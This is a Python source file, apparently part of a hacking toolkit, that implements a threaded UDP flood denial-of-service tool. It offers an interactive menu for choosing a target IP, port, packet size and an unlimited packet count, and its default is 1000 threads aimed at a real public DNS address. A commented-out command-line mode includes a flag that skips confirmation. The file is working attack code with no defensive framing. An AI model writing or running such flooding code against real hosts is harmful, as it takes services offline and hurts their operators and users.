import os
import re
import sys
import socket
import threading
from modules.helper import *



def main():
    banner.dos.main()
    print(" " * 15 + terminal.color + "1. UDP Flood")
    print(" " * 15 + terminal.color + "100. Return\n")
    option = input("[>] Option: ")
    if option == "100": return
    call = opts.get(option, main_invalid_option)
    cls()
    call()

# UDP Flood
class udp_cfg:
    target = "8.8.8.8"
    port = 80
    size = 10 #MB
    amount = 0
    threads = 1000
    sent = 0
def udp():
    banner.dos.udp_flood()
    if terminal.hide_ip_address:
        print(" " * 15 + terminal.color + "1. Target IP Address     : " + terminal.value + "[ REDACTED ]")
    else:
        print(" " * 15 + terminal.color + "1. Target IP Address     : " + terminal.value + str(udp_cfg.target))
    print(" " * 15 + terminal.color + "2. Target Port           : " + terminal.value + str(udp_cfg.port))
    print(" " * 15 + terminal.color + "3. Packet Size           : " + terminal.value + str(udp_cfg.size) + " MB")
    if udp_cfg.amount == 0:
        print(" " * 15 + terminal.color + "4. Packet Amount         : " + terminal.value + "Infinite")
    else:
        print(" " * 15 + terminal.color + "4. Packet Amount         : " + terminal.value + str(udp_cfg.amount))
    print(" " * 15 + terminal.color + "5. Threads               : " + terminal.value + str(udp_cfg.threads))
    print(" " * 15 + terminal.color + "99. Next")
    print(" " * 15 + terminal.color + "100. Return\n")

    option = input("[>] Select an option to modify: ")
    if option == "":
        error(ERROR_UNSELECTED_OPTION, udp)
    elif not option.isnumeric():
        error(ERROR_OPTION_NAN, udp)
    elif int(option) == 1:
        ip = input("[>] Target IP Address: ")
        if ip == "":
            error(ERROR_UNSELECTED_OPTION, udp)
        elif not re.match(REGEX_IP, ip):
            error("Invalid ip address.", udp)
        else:
            udp_cfg.target = str(ip)
            cls()
            udp()
    elif int(option) == 2:
        port = input("[>] Target Port: ")
        if port == "":
            error(ERROR_UNSELECTED_OPTION, udp)
        elif not port.isnumeric():
            error(ERROR_OPTION_NAN, udp)
        elif 1 > int(port) > 65535:
            error("Invalid port (1-65535)", udp)
        else:
            udp_cfg.port = int(port)
            cls()
            udp()
    elif int(option) == 3:
        size = input("[>] Packet size: ")
        if size == "":
            error(ERROR_UNSELECTED_OPTION, udp)
        elif not size.isnumeric():
            error(ERROR_OPTION_NAN, udp)
        else:
            udp_cfg.size = int(size)
            cls()
            udp()
    elif int(option) == 4:
        info("Type 0 for infinite")
        amount = input("[>] Packet amount: ")
        if amount == "":
            error(ERROR_UNSELECTED_OPTION, udp)
        elif not amount.isnumeric():
            error(ERROR_OPTION_NAN, udp)
        else:
            udp_cfg.amount = int(amount)
            cls()
            udp()
    elif int(option) == 5:
        threads = input("[>] Threads: ")
        if threads == "":
            error(ERROR_UNSELECTED_OPTION, udp)
        elif not threads.isnumeric():
            error(ERROR_OPTION_NAN, udp)
        elif int(threads) <= 0:
            error("Option cannot be 0 or less.", udp)
        else:
            udp_cfg.threads = int(threads)
            cls()
            udp()
    elif int(option) == 99:
        confirm = input("[>] Are you sure all the informations above are all correct? (Y/n) ")
        if confirm.lower() == "y" or confirm == "":
            cls()
            udpflood()
        else:
            cls()
            udp()
    elif int(option) == 100:
        cls()
        return
    else:
        error(ERROR_INVALID_OPTION, udp)
def udpflood():
    banner.dos.udp_flood()
    print(" " * 12 + terminal.color + "[i] To stop attack, simply exit the program as ctrl+c does not work with threading\n\n")
    thread_list = []

    for t in range(udp_cfg.threads):
        thread = threading.Thread(target=udpattack)
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join() 
def udpattack():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    s.connect((udp_cfg.target, udp_cfg.port))
    if int(udp_cfg.amount) == 0:
        try:
            while True:
                udp_cfg.sent += 1
                s.send(os.urandom(1) * udp_cfg.size)
                print(f"[i] Packet sent: {udp_cfg.sent}", end = "\r")
        except KeyboardInterrupt:
            cls()
            info(f"Finished with packet sent: {udp_cfg.sent}")
            udp()
    else:
        try:
            for i in range(1, int(udp_cfg.amount) + 1):
                s.send(os.urandom(1) * udp_cfg.size)
                print(f"[i] Packet sent: {i}/{udp_cfg.amount}", end = "\r")
            cls()
            info(f"Finished with packet sent: {i}/{udp_cfg.amount}")
            udp()
        except KeyboardInterrupt:
            cls()
            info(f"Finished with packet sent: {i}/{udp_cfg.amount}")
            udp()

def main_invalid_option():
    error(ERROR_INVALID_OPTION, main)

def udp_invalid_option():
    error(ERROR_INVALID_OPTION, udp)

opts = {
    "1": udp
}

# def udpattack_commandline(silent:bool = False):
#     if not silent:
#         opt = input("Do you want to continue? (Y/n) ")
#         if opt.lower() == "y" or opt == "":
#             pass
#         else:
#             sys.exit()
#     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
#     s.connect((udp_cfg.target, udp_cfg.port))
#     if int(udp_cfg.amount) == 0:
#         try:
#             i = 0
#             while True:
#                 i += 1
#                 s.send(os.urandom(1) * udp_cfg.size)
#                 print(f"[DOS] Packet sent: {i}", end = "\r")
#         except KeyboardInterrupt:
#             print(f"[DOS] Finished with packet sent: {i}")
#             sys.exit()
#     else:
#         try:
#             for i in range(1, int(udp_cfg.amount) + 1):
#                 s.send(os.urandom(1) * udp_cfg.size)
#                 print(f"[DOS] Packet sent: {i}/{udp_cfg.amount}", end = "\r")
#             print(f"[DOS] Finished with packet sent: {i}/{udp_cfg.amount}")
#             sys.exit()
#         except KeyboardInterrupt:
#             print(f"[DOS] Finished with packet sent: {i}/{udp_cfg.amount}")
#             sys.exit()

# try:
#     sys.argv.pop(0)
#     if len(sys.argv) > 0:
#         usage = """Usage:  udp_cfg.py [--help -h] [--silent -y] [--target -t IP] [--port -p PORT] [--size -s SIZE] [--amount -a AMOUNT]
#                 --target OR -t <IP>     : Target IP

#                 --port OR -p <PORT>     : Target Port

#                 --size OR -s <SIZE>     : Packet size in megabytes.

#                 --amount OR -a <AMOUNT> : Packet amount
#                                         : Set to 0 to run infinitely

#                 --silent OR -y          : Ignore confirmation (OPTIONAl)"""
#         ip = False
#         port = False
#         size = False
#         amount = False
#         silent = False
#         for args in sys.argv:
#             if args == "--help" or args == "-h":
#                 print(usage)
#                 sys.exit()
#             elif args == "--target" or args == "-t":
#                 if not ip:
#                     try:
#                         ip = sys.argv[sys.argv.index(args) + 1]
#                         if ip == "":
#                             print(usage)
#                             sys.exit()
#                         elif not re.match(REGEX_IP, ip):
#                             print("Error: Invalid ip address.")
#                             sys.exit()
#                         else:
#                             udp_cfg.target = ip
#                             ip = True
#                     except IndexError:
#                         print(usage)
#                         sys.exit()
#                 else:
#                     print("Error: Target has already been set to " + udp_cfg.target)
#                     sys.exit()
#             elif args == "--port" or args == "-p":
#                 if not port:
#                     try:
#                         port = sys.argv[sys.argv.index(args) + 1]
#                         if port == "":
#                             print(usage)
#                             sys.exit()
#                         elif not re.match(REGEX_PORT, port):
#                             print("Error: Invalid port.")
#                             sys.exit()
#                         else:
#                             udp_cfg.port = int(port)
#                             port = True
#                     except IndexError:
#                             print(usage)
#                             sys.exit()
#                 else:
#                     print("Error: Port has already been set to " + udp_cfg.port)
#                     sys.exit()
#             elif args == "--size" or args == "-s":
#                 if not size:
#                     try:
#                         size = sys.argv[sys.argv.index(args) + 1]
#                         if size == "":
#                             print(usage)
#                             sys.exit()
#                         elif not size.isnumeric():
#                             print("Error: Size is not a number.")
#                             sys.exit()
#                         else:
#                             udp_cfg.size = int(size)
#                             size = True
#                     except IndexError:
#                         print(usage)
#                         sys.exit()
#                 else:
#                     print("Error: Size has already been set to " + udp_cfg.size)
#                     sys.exit()
#             elif args == "--amount" or args == "-a":
#                 if not amount:
#                     try:
#                         amount = sys.argv[sys.argv.index(args) + 1]
#                         if amount == "":
#                             print(usage)
#                             sys.exit()
#                         elif not amount.isnumeric():
#                             print("Error: Amount is not a number.")
#                             sys.exit()
#                         else:
#                             udp_cfg.amount = int(amount)
#                             amount = True
#                     except IndexError:
#                         print(usage)
#                         sys.exit()
#                 else:
#                     print("Error: Amount has already been set to " + udp_cfg.amount)
#                     sys.exit()
#             elif args == "--silent" or args == "-y":
#                 silent = True

#         if not ip:
#             print("Error: Target is undefined.\n")
#             print(usage)
#             sys.exit()
#         elif not port:
#             print("Error: Port is undefined.\n")
#             print(usage)
#             sys.exit()
#         elif not size:
#             print("Error: Size is undefnied.\n")
#             print(usage)
#             sys.exit()
#         elif not amount:
#             print("Error: Amount is undefined.\n")
#             print(usage)
#             sys.exit()
#         else:
#             udpattack_commandline(silent)         
# except IndexError:
#     udp()